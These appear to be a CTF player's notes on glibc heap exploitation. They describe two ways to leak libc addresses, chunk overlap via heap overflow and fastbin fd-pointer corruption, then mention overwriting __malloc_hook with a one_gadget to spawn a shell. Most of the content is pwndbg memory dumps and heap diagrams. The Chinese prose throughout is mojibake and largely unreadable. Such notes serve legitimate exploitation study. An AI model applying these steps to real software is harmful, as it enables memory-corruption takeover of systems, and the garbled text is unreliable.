
è„‘å­æ˜¯ä¸å¤Ÿç”¨äº† è®°ä¸‹æ¥å¥½äº†
åœ¨CTFwiki å’Œ ä¸ç¥çš„åšå®¢çœ‹åˆ°äº†ä¸¤ç§leakçš„æ–¹æ³• éƒ½å¾ˆå·§å¦™äº†

ä¸ç¥çš„æ–¹æ³•
https://blog.csdn.net/qq_29343201/article/details/66476135
åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹chunk_sizeï¼Œé€ æˆchunk overlapï¼Œdumpçš„æ—¶å€™å°±å¯ä»¥æŠŠåé¢ä¸€ä¸ªchunkçš„fdå’Œbkæ˜¾ç¤ºå‡ºæ¥äº†

åˆ†é…chunk 0ï¼ˆsize = 0x60ï¼‰åˆ†é…chunk1ï¼ˆ0x40ï¼‰
+---------------+---------------+------------------+
|               |               |                  |
|     chunk 0   |    chunk 1    |      chunk 1     |
|      0x60     |   head(0x10)  |     content 0x40 |
|               |               |                  |
+---------------+---------------+------------------+
pwndbg> x/50gx 0x5566684e9000
0x5566684e9000:	0x0000000000000000	0x0000000000000071
0x5566684e9010:	0x0000000000000000	0x0000000000000000
0x5566684e9020:	0x0000000000000000	0x0000000000000000
0x5566684e9030:	0x0000000000000000	0x0000000000000000
0x5566684e9040:	0x0000000000000000	0x0000000000000000
0x5566684e9050:	0x0000000000000000	0x0000000000000000
0x5566684e9060:	0x0000000000000000	0x0000000000000000
0x5566684e9070:	0x0000000000000000	0x0000000000000051
0x5566684e9080:	0x0000000000000000	0x0000000000000000

ä»chunk 0æ”¹å†™chunk1çš„å¤´ï¼Œæ”¹æˆ0x71
å†åˆ†é…ä¸€ä¸ªchunk2 ï¼ˆ0x100)

                                    fake chunk 1 ï¼ˆ0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   | content  |   content
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  (0x10)  |
|               |               |                  |             |          |
+---------------+---------------+------------------+-------------+----------+-------------+
0x56503d5e2000:	0x0000000000000000	0x0000000000000071
0x56503d5e2010:	0x6161616161616161	0x6161616161616161
0x56503d5e2020:	0x6161616161616161	0x6161616161616161
0x56503d5e2030:	0x6161616161616161	0x6161616161616161
0x56503d5e2040:	0x6161616161616161	0x6161616161616161
0x56503d5e2050:	0x6161616161616161	0x6161616161616161
0x56503d5e2060:	0x6161616161616161	0x6161616161616161
0x56503d5e2070:	0x0000000000000000	0x0000000000000071
0x56503d5e2080:	0x0000000000000000	0x0000000000000000
0x56503d5e2090:	0x0000000000000000	0x0000000000000000
0x56503d5e20a0:	0x0000000000000000	0x0000000000000000
0x56503d5e20b0:	0x0000000000000000	0x0000000000000000
0x56503d5e20c0:	0x0000000000000000	0x0000000000000111
0x56503d5e20d0:	0x0000000000000000	0x0000000000000000

è¿™ä¸ªæ—¶å€™free chunk 1å°±å¯ä»¥æŠŠfake chunk å˜æˆçœŸ chunkäº† ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜èƒ½ç¼–è¾‘chunk 2 çš„å†…å®¹ 
æˆ–è®¸è¿™å°±å«åšoverlapå§
ä½†æ˜¯åœ¨free chunk 1ä¹‹å‰ è¿˜éœ€è¦è¿‡freeå¯¹ next sizeçš„æ£€æŸ¥
åœ¨chunk 2 çš„contenté‡Œä¼ªé€ ä¸€ä¸ªå¤´éƒ¨å°±å¥½äº†
                                    fake chunk 1 ï¼ˆ0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   | content  |   fake head
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  (0x10)  |   (0x10)
|               |               |                  |             |          |
+---------------+---------------+------------------+-------------+----------+-------------+

0x563a6f582000:	0x0000000000000000	0x0000000000000071
0x563a6f582010:	0x6161616161616161	0x6161616161616161
0x563a6f582020:	0x6161616161616161	0x6161616161616161
0x563a6f582030:	0x6161616161616161	0x6161616161616161
0x563a6f582040:	0x6161616161616161	0x6161616161616161
0x563a6f582050:	0x6161616161616161	0x6161616161616161
0x563a6f582060:	0x6161616161616161	0x6161616161616161
0x563a6f582070:	0x0000000000000000	0x0000000000000071
0x563a6f582080:	0x0000000000000000	0x0000000000000000
0x563a6f582090:	0x0000000000000000	0x0000000000000000
0x563a6f5820a0:	0x0000000000000000	0x0000000000000000
0x563a6f5820b0:	0x0000000000000000	0x0000000000000000
0x563a6f5820c0:	0x0000000000000000	0x0000000000000111
0x563a6f5820d0:	0x6161616161616161	0x6161616161616161
0x563a6f5820e0:	0x0000000000000000	0x0000000000000071
0x563a6f5820f0:	0x0000000000000000	0x0000000000000000

free chunk 1ä¹‹ååœ¨ allocate ä¸€ä¸ª 0x60å¤§å°çš„chunk1 
è¿™ä¸ªæ—¶å€™free chunk2 çš„è¯ åœ¨chunk 1 çš„content é‡Œé¢å°±ä¼šæœ‰ chunk2 çš„fdã€bkäº† 
dump chunk 1 å°±å®Œæˆäº† leak
ä½†æ˜¯åœ¨è¿™é“é¢˜ä¸­ allocate chunkçš„è¯ä¼šå°† contentæ¸…ç©º 
æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®å¤ä¸€ä¸‹ chunk 2 head è®©ä»–æ¢å¤åˆ°ä¸Šé¢ğŸ‘†çš„æ ·å­
å¹¶ä¸”è¿˜éœ€è¦å†åˆ†é…ä¸€ä¸ªchunk é˜²æ­¢free chunk 2çš„æ—¶å€™ä¸top chunkåˆå¹¶
ä¹‹åå† free chunk2 å† dump chunk 1 
è¿™ä¸ªæ—¶å€™å †çš„æƒ…å†µï¼š
                                         chunk 1 ï¼ˆ0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   |   libc   |   fake head
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  fdã€bk   |
|               |               |                  |             |          |
+---------------+---------------+------------------+-------+-----+----------+-------------+
                                                           ^
                                                           |
                                                       recovered
0x56008e378000:	0x0000000000000000	0x0000000000000071
0x56008e378010:	0x6161616161616161	0x6161616161616161
0x56008e378020:	0x6161616161616161	0x6161616161616161
0x56008e378030:	0x6161616161616161	0x6161616161616161
0x56008e378040:	0x6161616161616161	0x6161616161616161
0x56008e378050:	0x6161616161616161	0x6161616161616161
0x56008e378060:	0x6161616161616161	0x6161616161616161
0x56008e378070:	0x0000000000000000	0x0000000000000071
0x56008e378080:	0x6161616161616161	0x6161616161616161
0x56008e378090:	0x6161616161616161	0x6161616161616161
0x56008e3780a0:	0x6161616161616161	0x6161616161616161
0x56008e3780b0:	0x6161616161616161	0x6161616161616161
0x56008e3780c0:	0x0000000000000000	0x0000000000000111
0x56008e3780d0:	0x00007f9ac37e5b78	0x00007f9ac37e5b78  <----libc fdã€bk
0x56008e3780e0:	0x0000000000000000	0x0000000000000071
0x56008e3780f0:	0x0000000000000000	0x0000000000000000

å†æ¥çœ‹ä¸€ä¸‹CTF WIKIä¸Šç»™çš„leakçš„æ–¹æ³•

é¦–å…ˆåˆ†é…å››ä¸ª 0x10çš„ chunk ï¼ˆfastbinï¼‰å’Œä¸€ä¸ª 0x80çš„chunkï¼ˆsmallbinï¼‰
+---------------+----------------+----------------+------------------+------------------+
|     chunk 0   |    chunk 1     |    chunk 2     |     chunk 3      |      chunk 4     |
|     0x20      |     0x20       |     0x20       |      0x20        |       0x90       |
|ï¼ˆhead+contentï¼‰|                |                |                  |                  |
+---------------+----------------+----------------+------------------+------------------+
å…ˆfree chunk 2å† free chunk 1 
çœ‹ä¸€ä¸‹å †çš„æƒ…å†µ
pwndbg> x/20gx 0x564cfaf1a000
0x564cfaf1a000:	0x0000000000000000	0x0000000000000021
0x564cfaf1a010:	0x0000000000000000	0x0000000000000000
0x564cfaf1a020:	0x0000000000000000	0x0000000000000021
0x564cfaf1a030:	0x0000564cfaf1a040	0x0000000000000000
0x564cfaf1a040:	0x0000000000000000	0x0000000000000021
0x564cfaf1a050:	0x0000000000000000	0x0000000000000000
0x564cfaf1a060:	0x0000000000000000	0x0000000000000021
0x564cfaf1a070:	0x0000000000000000	0x0000000000000000
0x564cfaf1a080:	0x0000000000000000	0x0000000000000091
0x564cfaf1a090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins 
fastbins
0x20: 0x564cfaf1a020 â€”â–¸ 0x564cfaf1a040 â—‚â€” 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0

ä»chunk 0ä¸­åˆ©ç”¨å †æº¢å‡ºæˆ‘ä»¬å»ä¿®æ”¹ä¸€ä¸‹ chunk 1ä¸­çš„æŒ‡é’ˆè®©å®ƒæŒ‡å‘chunk 4
0x55c7eeaeb000:	0x0000000000000000	0x0000000000000021
0x55c7eeaeb010:	0x6161616161616161	0x6161616161616161
0x55c7eeaeb020:	0x0000000000000000	0x0000000000000021
0x55c7eeaeb030:	0x000055c7eeaeb080	0x0000000000000000
0x55c7eeaeb040:	0x0000000000000000	0x0000000000000021
0x55c7eeaeb050:	0x0000000000000000	0x0000000000000000
0x55c7eeaeb060:	0x0000000000000000	0x0000000000000021
0x55c7eeaeb070:	0x0000000000000000	0x0000000000000000
0x55c7eeaeb080:	0x0000000000000000	0x0000000000000091
0x55c7eeaeb090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins 
fastbins
0x20: 0x55c7eeaeb020 â€”â–¸ 0x55c7eeaeb080 â—‚â€” 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0

ç„¶åæˆ‘ä»¬åœ¨æŠŠfreeçš„chunk å†åˆ†é…å›å» è¿™æ ·chunk 2å°±æŒ‡å‘chunk 4äº† 
ä¹‹åè€å¥—è·¯free small binå†dumpå‡ºfdã€bkå°±å¥½äº†
ä½†åœ¨åˆ†é…chunk 2 çš„æ—¶å€™ä¹Ÿè¦å…ˆé€šè¿‡ chunk 3æŠŠchunk 4çš„size æ”¹ä¸€ä¸‹ æ”¹æˆå’Œä¹‹å‰ä¸€æ ·çš„ï¼ˆ0x21)
è¿™ä¸ªæ—¶å€™ ç­‰äºæ˜¯ chunk 2å’Œchunk 4çš„æŒ‡é’ˆéƒ½åŒæ—¶æŒ‡å‘äº† chunk 4 
+---------------+----------------+----------------+------------------+-------------------+
|     chunk 0   |    chunk 1     |    chunk 2     |     chunk 3      |     chunk 2(0x21) |
|     0x20      |     0x20       |   (free)       |      0x20        |     chunk 4(0x91) |
|               |                |                |                  |                   |
+---------------+----------------+----------------+------------------+-------------------+
0x55b6f8080000:	0x0000000000000000	0x0000000000000021
0x55b6f8080010:	0x6161616161616161	0x6161616161616161
0x55b6f8080020:	0x0000000000000000	0x0000000000000021
0x55b6f8080030:	0x0000000000000000	0x0000000000000000
0x55b6f8080040:	0x0000000000000000	0x0000000000000021
0x55b6f8080050:	0x0000000000000000	0x0000000000000000
0x55b6f8080060:	0x0000000000000000	0x0000000000000021
0x55b6f8080070:	0x6161616161616161	0x6161616161616161
0x55b6f8080080:	0x0000000000000000	0x0000000000000021
0x55b6f8080090:	0x0000000000000000	0x0000000000000000

è¿™ä¸ªæ—¶å€™å†é€šè¿‡ chunk 3 ä¿®å¤ä¸€ä¸‹chunk 4çš„size
åˆ†é…ä¸€ä¸ªchunk5 é˜²æ­¢ä¸top chunkåˆå¹¶
freeæ‰chunk4 å°±æ‹¿åˆ°fdã€bkäº†
dump chunk2 å°±leakäº†
                                                                             chunk 2 pointer
                                                                                   +
                                                                                   |
                                                                                   |
+---------------+----------------+----------------+------------------+---------+---v----+
|     chunk 0   |    chunk 1     |    chunk 2     |     chunk 3      | chunk 4 |  libc  |
|     0x20      |     0x20       |    ï¼ˆfreeï¼‰    |      0x20        | head    |  fdã€bk |
|               |                |                |                  | 0x10    |        |
+---------------+----------------+----------------+------------------+---------+--------+
0x560daee17000:	0x0000000000000000	0x0000000000000021
0x560daee17010:	0x6161616161616161	0x6161616161616161
0x560daee17020:	0x0000000000000000	0x0000000000000021
0x560daee17030:	0x0000000000000000	0x0000000000000000
0x560daee17040:	0x0000000000000000	0x0000000000000021
0x560daee17050:	0x0000000000000000	0x0000000000000000
0x560daee17060:	0x0000000000000000	0x0000000000000021
0x560daee17070:	0x6161616161616161	0x6161616161616161
0x560daee17080:	0x0000000000000000	0x0000000000000091
0x560daee17090:	0x00007fc8596d4b78	0x00007fc8596d4b78
0x560daee170a0:	0x0000000000000000	0x0000000000000000


leak å®Œäº†ä¹‹åå°±æ˜¯ä¿®æ”¹ __malloc_hook ä¸º one_gadgetæ‹¿shell
è¿™ä¸ªåœ°æ–¹ä¹Ÿæ˜¯å­¦ä¹ åˆ°äº† __malloc_hook åœ°å€ä¸ä¸ºç©ºçš„è¯ä¼šé¦–å…ˆæ‰§è¡Œè¯¥åœ°å€
æœ‰ä¸“é—¨æ‰¾one_gadgetçš„å·¥å…·
https://github.com/david942j/one_gadget/tree/master/





